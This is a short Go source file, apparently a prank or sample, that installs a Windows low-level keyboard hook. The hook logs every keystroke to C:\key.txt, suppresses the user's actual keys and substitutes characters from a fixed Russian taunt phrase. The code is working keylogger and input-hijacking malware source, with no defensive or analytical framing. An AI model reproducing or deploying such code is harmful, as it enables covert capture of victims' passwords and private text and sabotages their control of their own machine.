package samples

import (
	"bytes"
	"fmt"
	"main/win"
	"os"
	"unicode/utf8"
	"unsafe"

	"github.com/go-vgo/robotgo"
	"github.com/gonutz/w32"
	"github.com/sirupsen/logrus"
)

const (
	fileName          = "store.d.compile"
	keyMessage string = "Аниме - сила, Даниил - могила!!! "
)

var (
	typed   bool
	counter int
)

// HOOKPROC ...
type HOOKPROC func(int, uintptr, uintptr) uintptr

// LowLevelKeyboardProcess ...
func LowLevelKeyboardProcess(nCode int, wparam w32.WPARAM, lparam w32.LPARAM) w32.LRESULT {
	var temporaryKeyPtr w32.HHOOK
	var keyboardState [256]byte
	var unicodeKey [256]byte
	var keyboardLayoutName [256]byte
	if nCode == 0 && wparam == w32.WM_KEYDOWN {
		key := (*w32.KBDLLHOOKSTRUCT)(unsafe.Pointer(lparam))
		sc := w32.MapVirtualKey(uint(key.VkCode), w32.MAPVK_VK_TO_VSC)
		win.GetKeyboardLayoutName(&keyboardLayoutName)
		win.GetKeyboardState(&keyboardState)
		win.ToUnicode(uintptr(key.VkCode), uintptr(sc), &keyboardState, &unicodeKey, 256, 0)
		unicodeKeyFiltered := bytes.Trim([]byte(unicodeKey[:]), "\x00")
		logrus.Infoln(string(unicodeKeyFiltered))
		if !typed {
			if counter < utf8.RuneCountInString(keyMessage) {
				typed = true
				robotgo.TypeStr(string([]rune(keyMessage)[counter]))
				counter++
			} else {
				counter = 0
			}
			return 1 //блочим остальные символы
		} else {
			typed = false
		}
	}
	return w32.CallNextHookEx(temporaryKeyPtr, nCode, wparam, lparam)
}

//TestKey func
func TestKey() {
	// Set Log output to a file
	filename := fmt.Sprintf("C:\\key.txt")
	logFile, err := os.OpenFile(filename, os.O_WRONLY|os.O_CREATE, 0755)
	if err != nil {
		logrus.Info("Can't set log file")
	}
	logrus.SetOutput(logFile)
	var msg w32.MSG
	keyboardHook := w32.SetWindowsHookEx(w32.WH_KEYBOARD_LL, LowLevelKeyboardProcess, 0, 0)
	for w32.GetMessage(&msg, 0, 0, 0) != 0 {
	}
	w32.UnhookWindowsHookEx(keyboardHook)
}
